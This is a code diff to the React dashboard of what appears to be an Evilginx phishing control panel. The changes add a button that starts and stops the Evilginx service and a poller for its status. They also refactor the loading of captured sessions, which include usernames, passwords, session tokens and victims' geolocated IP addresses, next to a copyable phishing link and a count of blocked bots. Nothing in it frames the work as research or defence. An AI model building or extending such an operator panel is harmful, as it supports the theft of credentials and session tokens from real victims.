@@ -37,6 +37,7 @@ export default function Dashboard() {
   const [isLoading, setIsLoading] = useState(false);
   const [geoCache, setGeoCache] = useState<Record<string, GeoData>>({});
   const [operationInProgress, setOperationInProgress] = useState(false);
+  const [isServiceRunning, setIsServiceRunning] = useState(true);
 
   // Pagination state
   const [currentPage, setCurrentPage] = useState(1);
@@ -62,6 +63,35 @@ export default function Dashboard() {
     } finally {
       setOperationInProgress(false);
     }
+  };
+
+  const toggleServiceStatus = () => {
+    withLoading(async () => {
+      try {
+        const response = await fetch("/api/toggle-service", {
+          method: "POST",
+        });
+
+        if (!response.ok) {
+          throw new Error("Failed to toggle service");
+        }
+
+        const data = await response.json();
+
+        // Update UI based on action performed
+        setIsServiceRunning(data.action === "started");
+
+        // Show success message
+        setError(`Evilginx service ${data.action} successfully`);
+        setTimeout(() => setError(null), 3000);
+      } catch (error) {
+        console.error("Error toggling service:", error);
+        setError(
+          error instanceof Error ? error.message : "Failed to toggle service"
+        );
+        setTimeout(() => setError(null), 3000);
+      }
+    });
   };
 
   const handleCopy = useCallback(() => {
@@ -195,6 +225,7 @@ export default function Dashboard() {
         // Try using the clipboard API first
         await navigator.clipboard.writeText(text);
         handleCopy();
+        // eslint-disable-next-line @typescript-eslint/no-unused-vars
       } catch (_) {
         console.log("Clipboard API not available, using fallback method");
         // Fallback: Create a temporary textarea element
@@ -254,116 +285,113 @@ export default function Dashboard() {
     const fetchData = async () => {
       console.log("Starting data fetch...");
       setOperationInProgress(true);
-    setIsLoading(true);
+      setIsLoading(true);
 
-        try {
-          console.log("Fetching sessions and blacklist data...");
-          const [sessionsResponse, blacklistResponse] = await Promise.all([
-            fetch("/api/sessions"),
-            fetch("/api/blacklist"),
-          ]);
+      try {
+        console.log("Fetching sessions and blacklist data...");
+        const [sessionsResponse, blacklistResponse] = await Promise.all([
+          fetch("/api/sessions"),
+          fetch("/api/blacklist"),
+        ]);
 
-          if (!sessionsResponse.ok || !blacklistResponse.ok) {
-            console.error("Response not OK:", {
-              sessions: sessionsResponse.status,
-              blacklist: blacklistResponse.status,
-            });
-            const errorData = await sessionsResponse.json();
-            throw new Error(errorData.message || "Failed to fetch data");
-          }
-
-          const sessionsData: Session[] = await sessionsResponse.json();
-          console.log("Received sessions data:", {
-            count: sessionsData.length,
-            sample: sessionsData.slice(0, 2).map((s) => ({
-              id: s.id,
-              username: s.username,
-              create_time: s.create_time,
-            })),
+        if (!sessionsResponse.ok || !blacklistResponse.ok) {
+          console.error("Response not OK:", {
+            sessions: sessionsResponse.status,
+            blacklist: blacklistResponse.status,
           });
-
-          const blacklistData = await blacklistResponse.json();
-          console.log("Received blacklist data:", {
-            ipsCount: blacklistData.ips?.length,
-          });
-
-          // Fetch geo data for new IPs - only get data for displayed items
-          const displayedSessions = sessionsData.slice(0, itemsPerPage * 2); // Load geo data for first 2 pages
-          const newGeoCache = { ...geoCache };
-          const newIPs = displayedSessions
-            .map((s) => s.remote_addr)
-            .filter(
-              (ip) =>
-                typeof ip === "string" && ip.trim() !== "" && !geoCache[ip]
-            );
-
-          console.log("New IPs to fetch geo data for:", newIPs.length);
-
-          if (newIPs.length > 0) {
-            const geoDataResults = await Promise.all(
-              newIPs.map((ip) => fetchGeoData(ip))
-            );
-            newIPs.forEach((ip, index) => {
-              if (geoDataResults[index]) {
-                newGeoCache[ip] = geoDataResults[index]!;
-              }
-            });
-            setGeoCache(newGeoCache);
-            console.log("Updated geo cache with new IP data");
-          }
-
-          const formattedSessions: Session[] = sessionsData.map((session) => ({
-            ...session,
-            formattedDate: formatDate(session.create_time),
-            tokens: session.tokens || {},
-            hasCredentials: Boolean(session.username && session.password),
-            landing_url: session.landing_url || "",
-            geoData:
-              typeof session.remote_addr === "string" &&
-              session.remote_addr.trim() !== ""
-                ? newGeoCache[session.remote_addr]
-                : undefined,
-          }));
-
-          // Filter to keep only latest complete sessions per ID
-          const filteredSessions =
-            filterLatestCompleteSessions(formattedSessions);
-
-          // Sort sessions by create_time in descending order (newest first)
-          const sortedSessions = filteredSessions.sort(
-            (a, b) => b.create_time - a.create_time
-          );
-
-          console.log("Formatted and filtered sessions:", {
-            originalCount: formattedSessions.length,
-            filteredCount: sortedSessions.length,
-            sample: sortedSessions.slice(0, 2).map((s) => ({
-              id: s.id,
-              username: s.username,
-              formattedDate: s.formattedDate,
-              hasCredentials: s.hasCredentials,
-            })),
-          });
-
-          setSessions(sortedSessions);
-          // Reset to first page when data changes significantly
-          if (Math.abs(sortedSessions.length - sessions.length) > 10) {
-            setCurrentPage(1);
-          }
-          setStats({
-            ...calculateStats(sortedSessions),
-            blacklistedBots: blacklistData.ips?.length || 0,
-          });
-          console.log("Updated state with new filtered sessions and stats");
-        } catch (error) {
-          console.error("Error in fetchData:", error);
-          setError(
-            error instanceof Error ? error.message : "An error occurred"
-          );
-        } finally {
-          setIsLoading(false);
-          setOperationInProgress(false);
+          const errorData = await sessionsResponse.json();
+          throw new Error(errorData.message || "Failed to fetch data");
         }
+
+        const sessionsData: Session[] = await sessionsResponse.json();
+        console.log("Received sessions data:", {
+          count: sessionsData.length,
+          sample: sessionsData.slice(0, 2).map((s) => ({
+            id: s.id,
+            username: s.username,
+            create_time: s.create_time,
+          })),
+        });
+
+        const blacklistData = await blacklistResponse.json();
+        console.log("Received blacklist data:", {
+          ipsCount: blacklistData.ips?.length,
+        });
+
+        // Fetch geo data for new IPs - only get data for displayed items
+        const displayedSessions = sessionsData.slice(0, itemsPerPage * 2); // Load geo data for first 2 pages
+        const newGeoCache = { ...geoCache };
+        const newIPs = displayedSessions
+          .map((s) => s.remote_addr)
+          .filter(
+            (ip) => typeof ip === "string" && ip.trim() !== "" && !geoCache[ip]
+          );
+
+        console.log("New IPs to fetch geo data for:", newIPs.length);
+
+        if (newIPs.length > 0) {
+          const geoDataResults = await Promise.all(
+            newIPs.map((ip) => fetchGeoData(ip))
+          );
+          newIPs.forEach((ip, index) => {
+            if (geoDataResults[index]) {
+              newGeoCache[ip] = geoDataResults[index]!;
+            }
+          });
+          setGeoCache(newGeoCache);
+          console.log("Updated geo cache with new IP data");
+        }
+
+        const formattedSessions: Session[] = sessionsData.map((session) => ({
+          ...session,
+          formattedDate: formatDate(session.create_time),
+          tokens: session.tokens || {},
+          hasCredentials: Boolean(session.username && session.password),
+          landing_url: session.landing_url || "",
+          geoData:
+            typeof session.remote_addr === "string" &&
+            session.remote_addr.trim() !== ""
+              ? newGeoCache[session.remote_addr]
+              : undefined,
+        }));
+
+        // Filter to keep only latest complete sessions per ID
+        const filteredSessions =
+          filterLatestCompleteSessions(formattedSessions);
+
+        // Sort sessions by create_time in descending order (newest first)
+        const sortedSessions = filteredSessions.sort(
+          (a, b) => b.create_time - a.create_time
+        );
+
+        console.log("Formatted and filtered sessions:", {
+          originalCount: formattedSessions.length,
+          filteredCount: sortedSessions.length,
+          sample: sortedSessions.slice(0, 2).map((s) => ({
+            id: s.id,
+            username: s.username,
+            formattedDate: s.formattedDate,
+            hasCredentials: s.hasCredentials,
+          })),
+        });
+
+        setSessions(sortedSessions);
+        // Reset to first page when data changes significantly
+        if (Math.abs(sortedSessions.length - sessions.length) > 10) {
+          setCurrentPage(1);
+        }
+        setStats({
+          ...calculateStats(sortedSessions),
+          blacklistedBots: blacklistData.ips?.length || 0,
+        });
+        console.log("Updated state with new filtered sessions and stats");
+      } catch (error) {
+        console.error("Error in fetchData:", error);
+        setError(error instanceof Error ? error.message : "An error occurred");
+      } finally {
+        setIsLoading(false);
+        setOperationInProgress(false);
+      }
     };
 
     fetchData();
@@ -385,6 +413,39 @@ export default function Dashboard() {
       window.removeEventListener("linkSettingsUpdated", handleLinkUpdate);
     };
   }, [calculateStats, fetchFullLink, geoCache, itemsPerPage, sessions.length]);
+
+  // Effect to fetch the service status on load
+  useEffect(() => {
+    const fetchServiceStatus = async () => {
+      try {
+        const response = await fetch("/api/service-status");
+
+        if (!response.ok) {
+          throw new Error("Failed to fetch service status");
+        }
+
+        const data = await response.json();
+        setIsServiceRunning(data.running);
+
+        if (data.error) {
+          console.warn("Service status warning:", data.error);
+        }
+      } catch (error) {
+        console.error("Error fetching service status:", error);
+        // Default to false if there's an error
+        setIsServiceRunning(false);
+      }
+    };
+
+    fetchServiceStatus();
+
+    // Set up polling to check service status periodically
+    const statusInterval = setInterval(fetchServiceStatus, 30000); // Every 30 seconds
+
+    return () => {
+      clearInterval(statusInterval);
+    };
+  }, []);
 
   const columns: TableColumn[] = [
     {
@@ -517,38 +578,67 @@ export default function Dashboard() {
           <MapWrapper sessions={sessions} />
         </div>
 
-        <div className="bg-[#232A34] px-6 py-6 rounded-lg flex items-center space-x-4">
-          <div className="flex-shrink-0">
-            <Image src="/icon4.svg" alt="Link" width={32} height={32} />
-          </div>
-          <div className="flex-grow">
-            <div className="text-sm text-gray-400">Your Link:</div>
-            <div className="text-gray-300 font-medium flex items-center space-x-2">
-              <span data-allow-select="true">
-                {fullLink || "No active link generated"}
-              </span>
-              {fullLink && (
-                <button
-                  onClick={() => copyToClipboard(fullLink)}
-                  data-allow-context-menu="true"
-                  className="text-indigo-500 hover:text-indigo-400 transition-colors"
-                >
-                  <svg
-                    className="w-5 h-5"
-                    fill="none"
-                    stroke="currentColor"
-                    viewBox="0 0 24 24"
-                  >
-                    <path
-                      strokeLinecap="round"
-                      strokeLinejoin="round"
-                      strokeWidth={2}
-                      d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"
-                    />
-                  </svg>
-                </button>
-              )}
+        <div className="bg-[#232A34] px-6 py-6 rounded-lg grid grid-cols-2 gap-4">
+          {/* Left half - Your Link section */}
+          <div className="flex items-center space-x-4">
+            <div className="flex-shrink-0">
+              <Image src="/icon4.svg" alt="Link" width={32} height={32} />
             </div>
+            <div className="flex-grow">
+              <div className="text-sm text-gray-400">Your Link:</div>
+              <div className="text-gray-300 font-medium flex items-center space-x-2">
+                <span data-allow-select="true">
+                  {fullLink || "No active link generated"}
+                </span>
+                {fullLink && (
+                  <button
+                    onClick={() => copyToClipboard(fullLink)}
+                    data-allow-context-menu="true"
+                    className="text-indigo-500 hover:text-indigo-400 transition-colors"
+                  >
+                    <svg
+                      className="w-5 h-5"
+                      fill="none"
+                      stroke="currentColor"
+                      viewBox="0 0 24 24"
+                    >
+                      <path
+                        strokeLinecap="round"
+                        strokeLinejoin="round"
+                        strokeWidth={2}
+                        d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"
+                      />
+                    </svg>
+                  </button>
+                )}
+              </div>
+            </div>
+          </div>
+
+          {/* Right half - Link status and button */}
+          <div className="flex items-center justify-end space-x-4">
+            <div
+              className={`px-4 py-1 border border-dashed rounded ${
+                isServiceRunning
+                  ? "text-green-500 border-green-500"
+                  : "text-gray-500 border-gray-500"
+              }`}
+            >
+              <span className="font-medium">Link Status:</span>{" "}
+              <span className="italic">
+                {isServiceRunning ? "running..." : "stopped"}
+              </span>
+            </div>
+            <button
+              onClick={toggleServiceStatus}
+              className={`${
+                isServiceRunning
+                  ? "bg-red-500 hover:bg-red-600"
+                  : "bg-green-500 hover:bg-green-600"
+              } text-white px-6 py-1 rounded transition-colors`}
+            >
+              {isServiceRunning ? "Stop Link" : "Run Link"}
+            </button>
           </div>
         </div>
 
@@ -663,7 +753,7 @@ export default function Dashboard() {
                     </button>
 
                     {/* Page numbers - show limited set to avoid overflow */}
-                    {[...Array(Math.min(5, totalPages))].map((_, i) => {
+                    {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
                       // Calculate which pages to show
                       let pageNum;
                       if (totalPages <= 5) {
